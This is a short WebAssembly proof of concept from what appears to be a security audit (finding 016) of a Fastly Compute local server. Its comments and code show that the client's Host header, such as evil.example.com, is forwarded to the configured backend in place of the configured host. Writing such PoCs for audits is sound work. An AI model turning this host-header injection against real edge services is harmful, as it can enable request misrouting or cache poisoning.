;; PoC for finding 016: Host header controls backend request authority
;;
;; In src/upstream.rs:252-273, canonical_host_header prefers the client's
;; Host header over the backend's configured host when override_host is
;; not set. This allows an attacker to control the Host header and URI
;; authority sent to the backend.
;;
;; Trigger: configure a backend "origin" without override_host. Send a
;; request with Host: evil.example.com. The backend will receive the
;; attacker-controlled Host header.
;;
;; Expected: the backend sees Host: evil.example.com instead of the
;; configured backend host.
;;
;; Required fastly.toml:
;;   [local_server.backends.origin]
;;   url = "http://127.0.0.1:7878"

(module
  (import "fastly_http_req" "body_downstream_get"
    (func $req_body_downstream_get (param i32 i32) (result i32)))
  (import "fastly_http_req" "send"
    (func $req_send (param i32 i32 i32 i32 i32 i32) (result i32)))
  (import "fastly_http_resp" "send_downstream"
    (func $resp_send_downstream (param i32 i32 i32) (result i32)))

  (memory (export "memory") 1)

  ;; Backend name "origin" at offset 0
  (data (i32.const 0) "origin")

  ;; Output pointers: req=100, body=104, resp=108, resp_body=112

  (func (export "_start")
    ;; Get the downstream request (which has the attacker's Host header)
    (call $req_body_downstream_get
      (i32.const 100)  ;; req_handle_out
      (i32.const 104)  ;; body_handle_out
    )
    drop

    ;; Forward it to the "origin" backend
    ;; The client's Host header will become the outbound authority
    (call $req_send
      (i32.load (i32.const 100))  ;; request handle
      (i32.load (i32.const 104))  ;; body handle
      (i32.const 0)               ;; backend name ptr
      (i32.const 6)               ;; backend name len ("origin")
      (i32.const 108)             ;; resp_handle_out
      (i32.const 112)             ;; resp_body_handle_out
    )
    drop

    ;; Forward the backend's response to the client
    (call $resp_send_downstream
      (i32.load (i32.const 108))  ;; response handle
      (i32.load (i32.const 112))  ;; body handle
      (i32.const 0)               ;; not streaming
    )
    drop
  )
)
